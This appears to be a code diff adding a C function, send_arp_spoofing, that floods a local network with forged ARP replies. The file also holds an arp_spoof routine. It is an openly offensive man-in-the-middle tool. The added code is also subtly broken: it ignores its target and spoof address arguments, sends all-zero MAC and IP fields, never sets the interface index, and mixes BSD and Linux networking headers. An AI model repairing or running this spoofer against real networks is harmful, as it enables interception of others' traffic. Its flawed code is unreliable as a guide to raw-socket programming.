@@ -11,6 +11,8 @@
 #include <sys/sockio.h>
 
 #include <hosts.h>
+#include <net/if_dl.h>
+
 
 int arp_spoof(char *interface, char* sender_ip, char* target_ip){
     struct in_addr target_ip_hdr;
@@ -110,3 +112,70 @@ void getAllInterfaces(){
     }
 
 
+
+
+
+void send_arp_spoofing(const char* iface, const char* target_ip, const char* spoof_ip) {
+    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(1);
+    }
+
+    struct ifreq ifr;
+    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
+    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
+        perror("Error getting interface index");
+        close(sockfd);
+        exit(1);
+    }
+
+    struct sockaddr_ll socket_address;
+    memset(&socket_address, 0, sizeof(socket_address));
+    socket_address.sll_family = AF_PACKET;
+    socket_address.sll_protocol = htons(ETH_P_ARP);
+
+    unsigned char packet[42] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination MAC: Broadcast
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC: We don't care
+                                 0x08, 0x06,                          // EtherType: ARP (0x0806)
+                                 0x00, 0x01,                          // Hardware type (Ethernet = 1)
+                                 0x08, 0x00,                          // Protocol type (IPv4 = 0x0800)
+                                 0x06, 0x04,                          // Hardware size (Ethernet = 6, IPv4 = 4)
+                                 0x00, 0x02,                          // ARP opcode (Reply = 2)
+                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Sender MAC: We don't care
+                                 0x00, 0x00, 0x00, 0x00,              // Sender IP: We don't care
+                                 0x00, 0x00, 0x00, 0x00,              // Target MAC: We don't care
+                                 0x00, 0x00, 0x00, 0x00};             // Target IP: We don't care
+
+    struct arphdr* arp_header = (struct arphdr*)(packet + 14);
+    arp_header->ar_hrd = htons(ARPHRD_ETHER);
+    arp_header->ar_pro = htons(ETH_P_IP);
+    arp_header->ar_hln = 6;
+    arp_header->ar_pln = 4;
+    arp_header->ar_op = htons(ARPOP_REPLY);
+
+    struct sockaddr* sa = (struct sockaddr*)&socket_address;
+    if (bind(sockfd, sa, sizeof(struct sockaddr_ll)) < 0) {
+        perror("Bind failed");
+        close(sockfd);
+        exit(1);
+    }
+
+    struct sockaddr_ll dest_addr;
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sll_family = AF_PACKET;
+    dest_addr.sll_protocol = htons(ETH_P_ARP);
+    memcpy(dest_addr.sll_addr, packet, 6);
+
+    while (1) {
+        if (sendto(sockfd, packet, 42, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
+            perror("Sendto failed");
+            close(sockfd);
+            exit(1);
+        }
+        printf("ARP Spoofing sent\n");
+        sleep(1);
+    }
+
+    close(sockfd);
+}
